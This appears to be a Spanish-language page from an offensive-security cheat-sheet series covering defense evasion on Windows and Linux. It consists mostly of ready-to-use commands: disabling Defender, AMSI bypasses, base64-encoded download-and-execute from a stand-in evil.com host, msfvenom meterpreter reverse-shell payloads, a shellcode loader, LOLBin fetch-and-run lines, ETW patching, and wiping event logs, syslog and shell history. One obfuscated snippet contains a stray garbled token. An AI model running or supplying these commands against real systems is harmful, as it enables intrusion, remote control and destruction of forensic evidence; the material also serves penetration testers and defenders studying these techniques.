# 🛡️ Fase 6: Evasión de defensas

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Objetivo:** Eludir los controles de seguridad (AV, EDR, AMSI y cortafuegos) para evitar la detección.

---

## 🛡️ Evasión de Windows Defender

### Desactivar Windows Defender (requiere administrador)

> **Compatibilidad:** los ejemplos de desactivación no garantizan cambios efectivos en sistemas actuales. Tamper Protection puede bloquear modificaciones de Defender incluso cuando la herramienta parece completarlas. Véase la [documentación de Microsoft](https://learn.microsoft.com/en-us/defender-endpoint/tamper-protection-overview). Los ejemplos de AMSI y ETW son dependientes de la versión y no constituyen evasiones universales.

```powershell
# Desactivar la supervisión en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true

# Desactivar todas las funciones de Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Añadir rutas excluidas
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Mediante el Registro
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Comprobar el estado de Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 Evasión de AMSI

### Evasión de AMSI desde PowerShell
```powershell
# Evasión 1 - amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Evasión 2 - Comando de una línea de Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Evasión 3 - Modificación de memoria
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Evasión de AMSI ofuscada
```powershell
# Ofuscación de cadenas
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Ofuscación de payloads

### Ofuscación de PowerShell
```powershell
# Codificación Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Concatenación de cadenas
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Ofuscación de binarios
```bash
# Codificación con msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# XOR personalizado
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Cargadores de shellcode
```c
// Cargador sencillo de shellcode en C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living Off The Land (LOLBins: uso de binarios del sistema)

### Descargar y ejecutar
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Ejecutar payloads
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Evasión de AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 Evasión de ETW y del registro de eventos

### Desactivar el seguimiento de eventos
```powershell
# Modificar ETW
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Borrar registros de eventos
```powershell
# Borrar todos los registros
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# O desactivar el registro de eventos
auditpol /clear /y
```

### Desactivar el registro de PowerShell
```powershell
# Desactivar Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Desactivar Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Evasión en Linux

### Timestomping (alteración de marcas temporales)
```bash
# Cambiar las marcas temporales de archivos
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Borrar registros
```bash
# Borrar el historial de bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Borrar registros del sistema
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Ocultación de procesos
```bash
# Ocultar el nombre del proceso
exec -a "[kworker/0:0]" ./malicious

# Ocultación mediante LD_PRELOAD
# Compilar una biblioteca que intercepte readdir() para ocultar procesos
```

---

## 🛠️ Herramientas

| Herramienta | Finalidad |
|------|---------|
| **Invoke-Obfuscation** | Ofuscación de PowerShell |
| **Veil** | Generación de payloads |
| **ScareCrow** | Generador de payloads para eludir EDR |
| **Donut** | Generador de shellcode |
| **Nimcrypt2** | Empaquetador PE |
| **PEzor** | Cargador de shellcode PE |

---

## 📊 Referencia rápida

### Métodos de detección y evasión

| Detección | Técnica de evasión |
|-----------|------------------|
| Basada en firmas | Ofuscación y codificación |
| AMSI | Modificación de memoria y scripts de evasión |
| ETW | Modificación de ETW |
| Registro de eventos | Desactivar el registro y borrar registros |
| AppLocker | LOLBins y rutas de evasión |
| Comportamiento | Uso de herramientas del propio sistema |

### Lista rápida de LOLBins

| Binario | Uso |
|--------|-----|
| certutil | Descargar archivos |
| bitsadmin | Descargar archivos |
| mshta | Ejecutar HTA |
| rundll32 | Ejecutar DLL/JS |
| regsvr32 | Ejecutar SCT |
| msbuild | Ejecutar XML |
| installutil | Ejecutar EXE |

---

## 🔗 Guías de referencia relacionadas

- [PowerShell](../../PowerShell/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

**Fase anterior:** [← 05 - Persistencia](./05-Persistence.es.md)

**Fase siguiente:** [07 - Acciones sobre los objetivos →](./07-Actions-Objectives.es.md)
